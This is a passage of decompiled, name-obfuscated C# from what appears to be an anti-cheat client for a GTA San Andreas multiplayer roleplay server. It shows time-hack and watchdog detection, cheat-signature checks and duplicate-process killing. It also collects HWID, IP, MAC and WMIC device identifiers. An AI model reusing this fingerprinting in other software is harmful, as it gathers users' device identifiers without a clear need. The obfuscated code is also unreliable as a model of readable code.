						MapperRef.PatchSingleton(3);
						this.label_0.ForeColor = Color.Red;
						this.label_0.Text = "Saat & tarih ayarlarınızda problem bulunduğu için oyun kapatıldı.";
						MapperRef.CreateSingleton("Time Hack detected. CODE: 2 OLDTIME: " + Dispatcher.status.ToString() + " NEWTIME: " + num2.ToString());
						ProductReaderStructBuilder.listenerIdentifier = 0;
					}
				}
				else if (ProductReaderStructBuilder.listenerIdentifier > 0)
				{
					ProductReaderStructBuilder.listenerIdentifier--;
				}
				Dispatcher.status = Dispatcher.MoveIdentifier();
				Thread.Sleep(millisecondsTimeout);
			}
			e.Cancel = true;
		}

		// Token: 0x06000137 RID: 311 RVA: 0x0000A3E4 File Offset: 0x000085E4
		private int SortIdentifier(string task, string pred, string filter, string counter2, string cont3)
		{
			object[] array = TaskReader.TestRule(13, new object[]
			{
				task,
				pred,
				filter,
				counter2,
				cont3
			}, this);
			return (int)array[0];
		}

		// Token: 0x06000138 RID: 312 RVA: 0x0000A448 File Offset: 0x00008648
		private void ChangeIdentifier(object sender, DoWorkEventArgs e)
		{
			Dispatcher.<>c__DisplayClass111_0 CS$<>8__locals1 = new Dispatcher.<>c__DisplayClass111_0();
			CS$<>8__locals1.m_DispatcherRef = this;
			BackgroundWorker backgroundWorker = sender as BackgroundWorker;
			int millisecondsTimeout = 60000;
			CS$<>8__locals1.configRef = 0;
			while (!backgroundWorker.CancellationPending)
			{
				Dispatcher.m_Listener = Dispatcher.MoveIdentifier();
				if (CS$<>8__locals1.configRef == 1 && Dispatcher.MoveIdentifier() > Dispatcher.facade + 240L)
				{
					CS$<>8__locals1.configRef = 0;
					MapperRef.PatchSingleton(2223);
					this.label_0.Text = "İşlem alt kontrolü bozuldu.";
					this.label_0.ForeColor = Color.Red;
					MapperRef.NewSingleton("SUSPENDEDCHILPROTHREAD", (Dispatcher.MoveIdentifier() - Dispatcher.facade).ToString(), "", "", 0);
					Dispatcher.facade = 0L;
				}
				if (CS$<>8__locals1.configRef == 0)
				{
					CS$<>8__locals1.configRef = 1;
					Dispatcher.facade = Dispatcher.MoveIdentifier();
					Dispatcher.thread_0 = new Thread(new ThreadStart(CS$<>8__locals1.CompareReader));
					Dispatcher.thread_0.Start();
				}
				Thread.Sleep(millisecondsTimeout);
			}
		}

		// Token: 0x06000139 RID: 313 RVA: 0x0000A558 File Offset: 0x00008758
		public void LoginIdentifier()
		{
			try
			{
				int num;
				string state;
				if (Dispatcher.SelectIdentifier() != null)
				{
					string text = ProductReaderStructBuilder.helperIdentifier.Replace("_", " ");
					num = 1;
					if (text.Length > 0)
					{
						state = text + " - Oyunda";
					}
					else
					{
						state = "Bilinmiyor - Oyunda";
					}
				}
				else
				{
					state = "Client ekranı";
					num = 0;
				}
				if (num != ProductReaderStructBuilder._AdapterIdentifier)
				{
					this.config.SetPresence(new RichPresence
					{
						Details = "www.rina-roleplay.com",
						State = state,
						Timestamps = ProductReaderStructBuilder.m_BroadcasterIdentifier,
						Assets = new Assets
						{
							LargeImageKey = "rina_logo",
							LargeImageText = "Rina Roleplay oynuyor.",
							SmallImageKey = "rina_logo"
						}
					});
					ProductReaderStructBuilder._AdapterIdentifier = num;
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600013A RID: 314 RVA: 0x0000A630 File Offset: 0x00008830
		private void SetIdentifier(object sender, DoWorkEventArgs e)
		{
			Dispatcher.<>c__DisplayClass113_0 CS$<>8__locals1 = new Dispatcher.<>c__DisplayClass113_0();
			CS$<>8__locals1._BaseRef = this;
			BackgroundWorker backgroundWorker = sender as BackgroundWorker;
			int millisecondsTimeout = 60000;
			CS$<>8__locals1._DatabaseRef = 0;
			while (!backgroundWorker.CancellationPending)
			{
				ProductReaderStructBuilder.long_0 = Dispatcher.MoveIdentifier();
				if (CS$<>8__locals1._DatabaseRef == 0)
				{
					CS$<>8__locals1._DatabaseRef = 1;
					Dispatcher.m_Indexer = new Thread(new ThreadStart(CS$<>8__locals1.ComputeReader));
					Dispatcher.m_Indexer.Start();
				}
				Thread.Sleep(millisecondsTimeout);
			}
		}

		// Token: 0x0600013B RID: 315 RVA: 0x00002E05 File Offset: 0x00001005
		private void AwakeIdentifier(object sender, RunWorkerCompletedEventArgs e)
		{
			this.backgroundWorker_0.CancelAsync();
			this.backgroundWorker_0.RunWorkerAsync();
		}

		// Token: 0x0600013C RID: 316 RVA: 0x00002E1D File Offset: 0x0000101D
		private void CustomizeIdentifier(object sender, RunWorkerCompletedEventArgs e)
		{
			this._ContextRef.CancelAsync();
			this._ContextRef.RunWorkerAsync();
		}

		// Token: 0x0600013D RID: 317 RVA: 0x00002E35 File Offset: 0x00001035
		public static string InvokeIdentifier(string res)
		{
			char[] array = res.ToCharArray();
			Array.Reverse(array);
			return new string(array);
		}

		// Token: 0x0600013E RID: 318 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void CreateIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x0600013F RID: 319 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void FlushIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x06000140 RID: 320 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void CalcIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x06000141 RID: 321 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void PrepareIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x06000142 RID: 322 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void DeleteIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x06000143 RID: 323 RVA: 0x0000A6A8 File Offset: 0x000088A8
		private void CallIdentifier(object sender, EventArgs e)
		{
			MapperRef.FlushSingleton();
			Dispatcher.m_Base.Add("OZt4nd8ZZpAEnZBdU3Z7");
			Dispatcher.m_Base.Add("fkheb1PFtPIKTi05Zpzz");
			Dispatcher.m_Base.Add("0kx96D8OzZ3rznUk4qyi");
			Dispatcher.m_Base.Add("TgAji9cqMALlhJV12elB");
			Dispatcher.m_Base.Add("0XQ3XXjUo3HTzzevUmDm");
			Dispatcher.m_Base.Add("F3Ib4qRHXDgQwoJyhWra");
			Dispatcher.m_Base.Add("eRWoJ0s1B0uln8fFgxqX");
			Dispatcher.m_Base.Add("iUE0FKl2Ntawpt6sbV7u");
			Dispatcher.m_Base.Add("me9fMa0WTreWRrmYpBh7");
			Dispatcher.m_Base.Add("kyJB0qCUq269fzREzRxD");
			Dispatcher.m_Base.Add("WnTufxOov40st4L6qZF9");
			Dispatcher.m_Base.Add("7csfQq3YunqM9ziygmw8");
			Dispatcher.m_Base.Add("EyqWVpgOvZkyJCAmlgCh");
			Dispatcher.m_Base.Add("D2RAYhyatrMYrZjLdlqL");
			Dispatcher.m_Base.Add("nSdcM6NAAyekiwYHQqZl");
			Dispatcher.m_Base.Add("B3RPgAHYEpwKsFCkrLSq");
			Dispatcher.m_Base.Add("JgQuRU88IQC5Z77JUTiD");
			Dispatcher.m_Base.Add("v57wd6YIJTGhettATB8L");
			Dispatcher.m_Base.Add("Qzc1nrxQwuIOMrGynhXu");
			Dispatcher.m_Base.Add("ad5AKkogV91AfmdNwkEO");
			Dispatcher.m_Base.Add("vaG2jNiDHa5p18hazzyZ");
			Dispatcher.m_Base.Add("BbYJbJOcX4w5F84nrWYl");
			Dispatcher.m_Base.Add("QGMq1ffFpBV64UpWeLCP");
			Dispatcher.m_Base.Add("lrLJqwoJGAuwmqA12MWR");
			Dispatcher.m_Base.Add("VFqyK09HS3920srKbBvp");
			Dispatcher.m_Base.Add("wVjVwspocrBWWAnFz53M");
			Dispatcher.m_Base.Add("oGMgDdEBpy8vHa5RZQHa");
			Dispatcher.m_Base.Add("BAUsGUgYBvi7tGMJRmy6");
			Dispatcher.m_Base.Add("l1nEhAHzWbRlGQeOi9pz");
			Dispatcher.m_Base.Add("PLpbqWSUnkAoLJam79cD");
			Dispatcher.m_Base.Add("SWbChkYzbfB0XKKcE1wb");
			Dispatcher.m_Base.Add("ZRlERlOLlbbW7l4u4SLB");
			Dispatcher.m_Base.Add("4FaDBRIw2bRkeqLALQwq");
			Dispatcher.m_Base.Add("Z3Yb3QdFgAbOUMD4TT2E");
			Dispatcher.m_Base.Add("0QjIrotDsTJrBMVOUGEx");
			Dispatcher.m_Base.Add("rrBABwOTnnjoZH81Y10w");
			Dispatcher.m_Base.Add("Ig8OIDYp7SaHel8gQhYE");
			Dispatcher.m_Base.Add("Zkcq9DLCmmMb2pvgsnox");
			Dispatcher.m_Base.Add("Ta9QRpW1vH3vYNaWDuaT");
			Dispatcher.m_Base.Add("I5B3gCvXSrgfg7aKdyJ8");
			Dispatcher.m_Base.Add("F5U7PteCDqjtT2YYMbte");
			Dispatcher.m_Base.Add("NOzV5qhSRxEmEwHGrjSv");
			Dispatcher.m_Base.Add("9Ocg4R5TAqIQLJVY9aJA");
			Dispatcher.m_Base.Add("AoXect0Wd914NAKW957w");
			Dispatcher.m_Base.Add("ebNIGbCQ5e4vRkoKQ4SN");
			Dispatcher.m_Base.Add("DyQb0qmcovqZS6xA5Nbq");
			Dispatcher.m_Base.Add("7HjmPVonDspqmixH2FrJ");
			Dispatcher.m_Base.Add("EqU8wj6HBrXi5nW9l16l");
			Dispatcher.m_Base.Add("NI85VXOjCS0dgtylMyt1");
			Dispatcher.m_Base.Add("zFjG4ZJbkzrZxPwW5C1P");
			Dispatcher.m_Base.Add("sqkTwAiMc5iMRvam2AHs");
			Dispatcher.m_Base.Add("Kd2XiFoFdCheMCsD5SNk");
			Dispatcher.m_Base.Add("2PcWLkcAiLOo4AcM1n6f");
			Dispatcher.m_Base.Add("fZKaPRgxgb6EGc9A4epo");
			Dispatcher.m_Base.Add("pJCNj8hiQYd0mSwAAlG9");
			Dispatcher.m_Base.Add("FHLEOcgR8nZkPETgIau7");
			Dispatcher.m_Base.Add("fP0IIV133SBrSAhcm2xL");
			Dispatcher.m_Base.Add("J7dYgJsix1trFydJBCiD");
			Dispatcher.m_Base.Add("kuy5ZNe3SKh6NNwKsusq");
			Dispatcher.m_Base.Add("yw35qZxwIPY4vAndktx3");
			Dispatcher.m_Base.Add("lFIn4TrpaXAL6TUXTfRa");
			Dispatcher.m_Base.Add("2ajBkzl7mSl08rm0m9qq");
			Dispatcher.m_Base.Add("rQiGJrCD2qOw2cbTrHdX");
			Dispatcher.m_Base.Add("08Gm5pOBmKQPIpWw7NIu");
			Dispatcher.m_Base.Add("WRjgeZMotIAmyiGalpt3");
			Dispatcher.m_Base.Add("rYy1MGiBLxfMBufX9IJn");
			Dispatcher.m_Base.Add("LIv4dk2eh1DbWmuP2Xao");
			Dispatcher.m_Base.Add("xeNNc12ef0pmgBs3rYpV");
			Dispatcher.m_Base.Add("6IcTB4F0MYf3XEvPZ3Pp");
			Dispatcher.m_Base.Add("4FEEfd1l5qNsoX7VPkiS");
			Dispatcher.m_Base.Add("0kGF2Rb8HKT4Spn41RW1");
			Dispatcher.m_Base.Add("HDEsDvrgokF0b5jgXJ3J");
			Dispatcher.m_Base.Add("iU1NeT7jYaN7HB8eNn9V");
			Dispatcher.m_Base.Add("NT4HJ9M77hkWK3TqaFRR");
			Dispatcher.m_Base.Add("GEFxqMf38desyg3wO1K4");
			Dispatcher.m_Base.Add("Zgwk37JrBl9o3JMeQtZA");
			Dispatcher.m_Base.Add("64YkqXguAr8AmWTNKQj3");
			Dispatcher.m_Base.Add("tGWLK6h9TPrSFSA4ZocS");
			Dispatcher.m_Base.Add("9yHnDOfweXcCXOp1chBx");
			Dispatcher.m_Base.Add("LTuAf0bPkFYrQ5TbMD6U");
			Dispatcher.m_Base.Add("M4k0pUF7P04bLHs6dJV1");
			Dispatcher.m_Base.Add("x5X0gVtjCe8GDrfOFsaX");
			Dispatcher.m_Base.Add("BrFjmwvJMKjmLg5mYWRQ");
			Dispatcher.m_Base.Add("4iAcBuNr58pP2gux67ud");
			Dispatcher.m_Base.Add("jLuuVi2la7KfxRNNecG5");
			Dispatcher.m_Base.Add("3QssdnIkbDrMcQWQ2lsb");
			Dispatcher.m_Base.Add("7wvkS2KuPwCOApEMJW2s");
			Dispatcher.m_Base.Add("BPG4sUHHnJI6ypyj2t3r");
			Dispatcher.m_Base.Add("aFL5rH066RA3eLF6BSrm");
			Dispatcher.m_Base.Add("pAvKpwz4fc4lmtsbNjHO");
			Dispatcher.m_Base.Add("ukOhB5O7NxLMgyC0q1rb");
			Dispatcher.m_Base.Add("69qB4rzAA4BsCYfY3c74");
			Dispatcher.m_Base.Add("fKYNy6gkdPDyk0pTkkN2");
			Dispatcher.m_Base.Add("l0SPSH2CeMdpPAa6tVP8");
			Dispatcher.m_Base.Add("NQkNZKgSFEq8sDHUCLAf");
			Dispatcher.m_Base.Add("yzM5F818BdeRcC8pHNjB");
			Dispatcher.m_Base.Add("tj8hZFSq4blLgTdPMlv1");
			Dispatcher.m_Base.Add("wXP72vnkO9eLMslKSphJ");
			Dispatcher.m_Base.Add("hdtln0yAp9O2StGrXkZL");
			Dispatcher.m_Base.Add("xwQGmrUbw1JmTkhc4zR");
			Dispatcher.m_Base.Add("bMf7kCL8O1Fwyu7FJ1hC");
			Dispatcher.m_Base.Add("9ppZD4wB6vnmLXeN4Ca5");
			Dispatcher.m_Base.Add("5vhT7xpjIsPVorWQYGcj");
			Dispatcher.m_Base.Add("x4cMqulh7yasOBJCsPhV");
			Dispatcher.m_Base.Add("E27HBhvpClxosSNXzdkQ");
			Dispatcher.m_Base.Add("OM4ZIEyxV4tmg2k6WSo3");
			Dispatcher.m_Base.Add("k4XY4xX84N2TZtTb0Mjs");
			Dispatcher.m_Base.Add("Jo4uO1Cn8Q5dREhBaqkn");
			Dispatcher.m_Base.Add("QbrO2bVR4F1NAGbID570");
			MapperWatcherClass.ValidateRule(85, "bad pPedSelfSA", "14ZR2jhbtdgXyGD1gpXqQQ==");
			Control.CheckForIllegalCrossThreadCalls = false;
			base.FormClosing += this.CalcRef;
			base.FormClosed += this.PrepareRef;
			base.MouseDown += this.RateRef;
			base.MouseUp += this.ValidateRef;
			base.MouseMove += this.VerifyRef;
			this.label_0.Text = "Client açıldı.";
			this.label_0.ForeColor = Color.White;
			this.m_ClientRef.Text = "[ RAC ]";
			this.m_ClientRef.ForeColor = Color.Green;
			this._RequestRef.RunWorkerAsync();
			this._ReponseRef.RunWorkerAsync();
			this.backgroundWorker_0.RunWorkerAsync();
			this.m_StateRef.RunWorkerAsync();
			this._ContextRef.RunWorkerAsync();
			this.workerRef.Text = MapperRef.m_AdapterRef;
			Process currentProcess = Process.GetCurrentProcess();
			Process[] array = Process.GetProcessesByName(currentProcess.ProcessName).ToArray<Process>();
			int i;
			if (array.Length > 1)
			{
				Process[] array2 = array;
				i = 0;
				while (i < array2.Length)
				{
					Process process = array2[i];
					int num = DateTime.Compare(process.StartTime, currentProcess.StartTime);
					if (num < 0)
					{
						try
						{
							process.Kill();
							goto IL_7C6;
						}
						catch
						{
							goto IL_7C6;
						}
						goto IL_7B5;
					}
					goto IL_7B5;
					IL_7C6:
					i++;
					continue;
					IL_7B5:
					if (num > 0)
					{
						try
						{
							currentProcess.Kill();
						}
						catch
						{
						}
						goto IL_7C6;
					}
					goto IL_7C6;
				}
				OrderVisitorException.TestReader("Client zaten arkaplanda çalıştığı için kapatıldı.", "Rina Client zaten çalışıyor!");
			}
			this.m_RuleRef.VisitSingleton();
			Dispatcher._Proc.DoWork += this.AwakeRef;
			ProductReaderStructBuilder.proxyIdentifier = Dispatcher.MoveIdentifier();
			this._StructRef.Text = MapperRef.fieldRef;
			this.m_Proxy = MapperRef.fieldRef;
			this.m_MerchantRef.Text = string.Concat(new string[]
			{
				"Bilgilendirmeler:\n\nHWID: ",
				ProductReaderStructBuilder.factoryIdentifier,
				"\nIP: ",
				ProductReaderStructBuilder._MethodIdentifier,
				"\nMAC: ",
				ProductReaderStructBuilder._SetterIdentifier,
				"\nEXT: ",
				ProductReaderStructBuilder._AccountIdentifier,
				"\nWMIC: ",
				MapperRef.PrintSingleton()
			});
			MetroLabel merchantRef = this.m_MerchantRef;
			Control control = merchantRef;
			string[] array3 = new string[7];
			array3[0] = merchantRef.Text;
			array3[1] = "\n\nİzinli CLEO sayısı: ";
			int num2 = 2;
			i = ProductReaderStructBuilder.dispatcherIdentifier.Count;
			array3[num2] = i.ToString();
			array3[3] = "\nİzinli ENB sayısı: ";
			int num3 = 4;
			i = ProductReaderStructBuilder._ConfigIdentifier.Count;
			array3[num3] = i.ToString();
			array3[5] = "\nİzinli ASI sayısı: ";
			int num4 = 6;
			i = ProductReaderStructBuilder.m_BaseIdentifier.Count;
			array3[num4] = i.ToString();
			control.Text = string.Concat(array3);
			MapperWatcherClass.ValidateRule(86, "cheat_handle_actor_air_brake()", "GXw0XonDDjuxIGm4LpmqcOZZUbGXtM5Iu8v8H2Q39KU=");
			MapperWatcherClass.ValidateRule(87, "patcher_install()", "5df9o2tau1Nc5iBeeJLXRo8PNEipXmTUjFUdfpI0N2s=");
		}

		// Token: 0x06000144 RID: 324 RVA: 0x00002E48 File Offset: 0x00001048
		public void RateIdentifier()
		{
			this.m_Page.Stop();
		}

		// Token: 0x06000145 RID: 325 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void ValidateIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x06000146 RID: 326 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void VerifyIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x06000147 RID: 327 RVA: 0x0000AFFC File Offset: 0x000091FC
		private void PopIdentifier(object sender, EventArgs e)
		{
			new StringBuilder();
			int num = 1;
			foreach (Process process in Process.GetProcesses("."))
			{
				try
				{
					if (process.MainWindowTitle.Length > 0)
					{
						if (process.MainWindowTitle.Contains("GTA: San Andreas") || process.MainWindowTitle.Contains("GTA:SA:MP"))
						{
							Process.GetProcessesByName(process.MainWindowTitle.ToString());
							MessageBox.Show("Bu işlemi yapabilmek için ilk önce oyunu kapatmalısınız.", "İşlem gerçekleştirilemedi", MessageBoxButtons.OK, MessageBoxIcon.Hand);
							return;
						}
						num++;
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.ToString());
				}
			}
			if (!File.Exists(this.m_Proxy + MapperWatcherClass.VerifyRule(26, "/samp.exe")) || !File.Exists(this.m_Proxy + MapperWatcherClass.VerifyRule(27, "/gta_sa.exe")))
			{
				MessageBox.Show("Seçilen klasörde SA-MP veya GTA:SA yok.");
				return;
			}
			if (MapperRef.fieldRef == this.m_Proxy)
			{
				MessageBox.Show("Herhangi bir ayar yapmadınız.");
				return;
			}
			string fieldRef = MapperRef.fieldRef;
			MapperRef.fieldRef = this._Service.SelectedPath;
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\SAMP\\", true);
			registryKey.SetValue("gta_sa_exe", this._Service.SelectedPath);
			if (this.m_RuleRef.SortSingleton() <= 0)
			{
				registryKey.SetValue("gta_sa_exe", this._Service.SelectedPath);
				MessageBox.Show("Oyun yolunu başarıyla değiştirdiniz, clienti tekrar çalıştırmanız gerekmektedir.");
				Application.Exit();
				return;
			}
			MessageBox.Show("Seçtiğiniz oyun yolunda hile bulunduğu için kaydedilemedi.");
			MapperRef.fieldRef = fieldRef;
			registryKey.SetValue("gta_sa_exe", fieldRef);
		}

		// Token: 0x06000148 RID: 328 RVA: 0x00002E55 File Offset: 0x00001055
		private void FillIdentifier(object sender, EventArgs e)
		{
			this._Service.Description = "GTA-SA / SA-MP'nın kurulu olduğu klasörü seçiniz;";
			this._Service.ShowDialog();
			this.m_Proxy = this._Service.SelectedPath;
			this._StructRef.Text = this.m_Proxy;
		}

		// Token: 0x06000149 RID: 329 RVA: 0x0000B1BC File Offset: 0x000093BC
		private void DisableIdentifier(object sender, EventArgs e)
		{
			try
			{
				Thread thread = new Thread(new ThreadStart(Dispatcher.<>c.m_MockRef.RegisterReader));
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
				thread.Join();
			}
			catch
			{
			}
			OrderVisitorException.TestReader("Client bilgileriniz panoya kopyalandı.", "Kopyalandı");
		}

		// Token: 0x0600014A RID: 330 RVA: 0x0000B224 File Offset: 0x00009424
		private void EnableIdentifier(object sender, EventArgs e)
		{
			if (Dispatcher.MoveIdentifier() < Dispatcher.m_Parameter)
			{
				this.label_0.Text = "3 saniyede bir bu butonu kullanabilirsiniz.";
				this.label_0.ForeColor = Color.Red;
				return;
			}
			if (!Dispatcher._Proc.IsBusy)
			{
				Dispatcher._Proc.RunWorkerAsync();
			}
		}

		// Token: 0x0600014B RID: 331 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void CheckIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x0600014C RID: 332 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void TestIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x0600014D RID: 333 RVA: 0x00002E95 File Offset: 0x00001095
		private void DestroyIdentifier(object sender, EventArgs e)
		{
			this.SetRef();
		}

		// Token: 0x0600014E RID: 334 RVA: 0x00002E9D File Offset: 0x0000109D
		private void CloneIdentifier(object sender, EventArgs e)
		{
			Process.Start("https://www.rina-roleplay.com/");
		}

		// Token: 0x0600014F RID: 335 RVA: 0x00002EAA File Offset: 0x000010AA
		private void NewIdentifier(object sender, EventArgs e)
		{
			Process.Start("https://www.rina-roleplay.com/forum/sikayet/ekle");
		}

		// Token: 0x06000150 RID: 336 RVA: 0x00002EB7 File Offset: 0x000010B7
		private void VisitIdentifier(object sender, EventArgs e)
		{
			Process.Start("https://www.rina-roleplay.com/forum/index.php?action=helpdesk;sa=newticket");
		}

		// Token: 0x06000151 RID: 337 RVA: 0x00002EC4 File Offset: 0x000010C4
		private void LogoutIdentifier(object sender, EventArgs e)
		{
			Process.Start("https://www.rina-roleplay.com/forum/indir");
		}

		// Token: 0x06000152 RID: 338 RVA: 0x00002EC4 File Offset: 0x000010C4
		private void UpdateIdentifier(object sender, EventArgs e)
		{
			Process.Start("https://www.rina-roleplay.com/forum/indir");
		}

		// Token: 0x06000153 RID: 339 RVA: 0x00002ED1 File Offset: 0x000010D1
		private void CalculateIdentifier(object sender, EventArgs e)
		{
			Process.Start("https://www.rina-roleplay.com/forum/index.php?board=169.0");
		}

		// Token: 0x06000154 RID: 340 RVA: 0x00002EDE File Offset: 0x000010DE
		private void PatchIdentifier(object sender, EventArgs e)
		{
			Process.Start("https://www.rina-roleplay.com/forum/yetkililer");
		}

		// Token: 0x06000155 RID: 341 RVA: 0x00002EEB File Offset: 0x000010EB
		private void ResolveIdentifier(object sender, EventArgs e)
		{
			Process.Start("https://www.rina-roleplay.com/forum/helperler");
		}

		// Token: 0x06000156 RID: 342 RVA: 0x00002EF8 File Offset: 0x000010F8
		private void CancelIdentifier(object sender, EventArgs e)
		{
			Process.Start("https://www.rina-roleplay.com/forum/index.php?board=43.0");
		}

		// Token: 0x06000157 RID: 343 RVA: 0x00002F05 File Offset: 0x00001105
		private void ViewIdentifier(object sender, EventArgs e)
		{
			Process.Start("https://www.rina-roleplay.com/forum/index.php?board=57.0");
		}

		// Token: 0x06000158 RID: 344 RVA: 0x00002F12 File Offset: 0x00001112
		private void IncludeIdentifier(object sender, EventArgs e)
		{
			Process.Start("https://www.rina-roleplay.com/forum/index.php?board=44.0");
		}

		// Token: 0x06000159 RID: 345 RVA: 0x00002F1F File Offset: 0x0000111F
		private void RunIdentifier(object sender, EventArgs e)
		{
			Process.Start("https://www.rina-roleplay.com/forum/index.php?board=36.0");
		}

		// Token: 0x0600015A RID: 346 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void FindIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x0600015B RID: 347 RVA: 0x00002F2C File Offset: 0x0000112C
		private void ConcatIdentifier(object sender, EventArgs e)
		{
			Process.Start(Dispatcher.queue);
		}

		// Token: 0x0600015C RID: 348 RVA: 0x00002F2C File Offset: 0x0000112C
		private void MapIdentifier(object sender, EventArgs e)
		{
			Process.Start(Dispatcher.queue);
		}

		// Token: 0x0600015D RID: 349 RVA: 0x0000B274 File Offset: 0x00009474
		private void ReadIdentifier(object sender, DoWorkEventArgs e)
		{
			Dispatcher.<>c__DisplayClass148_0 CS$<>8__locals1 = new Dispatcher.<>c__DisplayClass148_0();
			CS$<>8__locals1._GetterRef = this;
			BackgroundWorker backgroundWorker = sender as BackgroundWorker;
			CS$<>8__locals1._CustomerRef = 0;
			while (!backgroundWorker.CancellationPending)
			{
				Dispatcher.m_Composer = Dispatcher.MoveIdentifier();
				if (CS$<>8__locals1._CustomerRef == 1 && Dispatcher.MoveIdentifier() > Dispatcher._Mapper + 240L && Dispatcher.MoveIdentifier() > Dispatcher._Field + 30L)
				{
					CS$<>8__locals1._CustomerRef = 0;
					MapperRef.PatchSingleton(2223);
					this.label_0.Text = "Hafıza alt kontrolü bozuldu.";
					this.label_0.ForeColor = Color.Red;
					MapperRef.NewSingleton("SUSPENDEDCHILMEMTHREAD", (Dispatcher.MoveIdentifier() - Dispatcher._Mapper).ToString(), ProductReaderStructBuilder.filterIdentifier.ToString() + " - " + ProductReaderStructBuilder._ParamsIdentifier.ToString(), ProductReaderStructBuilder._UtilsIdentifier.ToString() + " - " + ProductReaderStructBuilder.parserIdentifier.ToString(), Convert.ToInt32(ProductReaderStructBuilder.stubIdentifier));
					Dispatcher._Mapper = 0L;
				}
				if (CS$<>8__locals1._CustomerRef == 0 && Dispatcher.MoveIdentifier() > Dispatcher.adapter + 180L && Dispatcher.MoveIdentifier() > Dispatcher.m_Params + 30L)
				{
					CS$<>8__locals1._CustomerRef = 1;
					Dispatcher._Mapper = Dispatcher.MoveIdentifier();
					ProductReaderStructBuilder.stubIdentifier = 0L;
					ProductReaderStructBuilder._ParamsIdentifier = 0L;
					ProductReaderStructBuilder.filterIdentifier = 0L;
					ProductReaderStructBuilder.parserIdentifier = 0L;
					ProductReaderStructBuilder._UtilsIdentifier = 0L;
					Dispatcher._Pool = new Thread(new ThreadStart(CS$<>8__locals1.SortReader));
					Dispatcher._Pool.Start();
				}
				Thread.Sleep(1000);
			}
		}

		// Token: 0x0600015E RID: 350 RVA: 0x00002F39 File Offset: 0x00001139
		private void ForgotIdentifier(object sender, RunWorkerCompletedEventArgs e)
		{
			this.m_StateRef.CancelAsync();
			this.m_StateRef.RunWorkerAsync();
		}

		// Token: 0x0600015F RID: 351 RVA: 0x00002F51 File Offset: 0x00001151
		protected override void Dispose(bool initclose)
		{
			if (initclose && this.templateRef != null)
			{
				((IDisposable)this.templateRef).Dispose();
			}
			base.Dispose(initclose);
		}

		// Token: 0x06000160 RID: 352 RVA: 0x0000B454 File Offset: 0x00009654
		private void RevertIdentifier()
		{
			this.templateRef = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Dispatcher));
			this.label_0 = new Label();
			this.m_PropertyRef = new PictureBox();
			this.m_WatcherRef = new PictureBox();
			this.m_ConnectionRef = new PictureBox();
			this._VisitorRef = new PictureBox();
			this.authenticationRef = new System.Windows.Forms.Timer(this.templateRef);
			this._PolicyRef = new PictureBox();
			this.containerRef = new NotifyIcon(this.templateRef);
			this._InvocationRef = new System.Windows.Forms.Timer(this.templateRef);
			this.serverRef = new BackgroundWorker();
			this._RequestRef = new BackgroundWorker();
			this._ReponseRef = new BackgroundWorker();
			this.m_RulesRef = new System.Windows.Forms.Timer(this.templateRef);
			this.backgroundWorker_0 = new BackgroundWorker();
			this._ContextRef = new BackgroundWorker();
			this.m_ClientRef = new Label();
			this.collectionRef = new MetroButton();
			this.m_ModelRef = new MetroTabControl();
			this.m_IssuerRef = new MetroTabPage();
			this.metroLabel_0 = new MetroLabel();
			this._WriterRef = new MetroLabel();
			this.threadRef = new PictureBox();
			this.m_TokenRef = new MetroTabPage();
			this.paramRef = new MetroPanel();
			this._ObserverRef = new MetroLabel();
			this.m_MerchantRef = new MetroLabel();
			this._ProductRef = new MetroButton();
			this._StructRef = new MetroTextBox();
			this._DefinitionRef = new MetroLabel();
			this.taskRef = new MetroButton();
			this.expressionRef = new MetroTabPage();
			this.m_RegRef = new MetroButton();
			this._ErrorRef = new MetroButton();
			this.exceptionRef = new MetroButton();
			this.globalRef = new MetroButton();
			this.m_HelperRef = new MetroButton();
			this._EventRef = new MetroButton();
			this.factoryRef = new MetroButton();
			this.setterRef = new MetroButton();
			this.methodRef = new MetroButton();
			this.m_DecoratorRef = new MetroButton();
			this.accountRef = new MetroButton();
			this.m_ClassRef = new MetroButton();
			this.m_SerializerRef = new MetroPanel();
			this._SpecificationRef = new MetroLabel();
			this.m_ComparatorRef = new MetroTabPage();
			this.m_ProccesorRef = new MetroLabel();
			this.processRef = new MetroLabel();
			this.m_SchemaRef = new MetroLabel();
			this.m_TokenizerRef = new MetroLabel();
			this.roleRef = new MetroLabel();
			this.metroLabel_1 = new MetroLabel();
			this.algoRef = new MetroLabel();
			this._IteratorRef = new MetroLabel();
			this.messageRef = new MetroLabel();
			this.wrapperRef = new MetroLabel();
			this.producerRef = new MetroLabel();
			this._ManagerRef = new MetroLabel();
			this.m_ResolverRef = new MetroPanel();
			this.m_AttributeRef = new MetroButton();
			this.predicateRef = new MetroLabel();
			this.workerRef = new MetroTextBox();
			this._RegistryRef = new PictureBox();
			this._CandidateRef = new PictureBox();
			this.consumerRef = new MetroLabel();
			this.m_InstanceRef = new MetroLabel();
			this.m_StateRef = new BackgroundWorker();
			((ISupportInitialize)this.m_PropertyRef).BeginInit();
			((ISupportInitialize)this.m_WatcherRef).BeginInit();
			((ISupportInitialize)this.m_ConnectionRef).BeginInit();
			((ISupportInitialize)this._VisitorRef).BeginInit();
			((ISupportInitialize)this._PolicyRef).BeginInit();
			this.m_ModelRef.SuspendLayout();
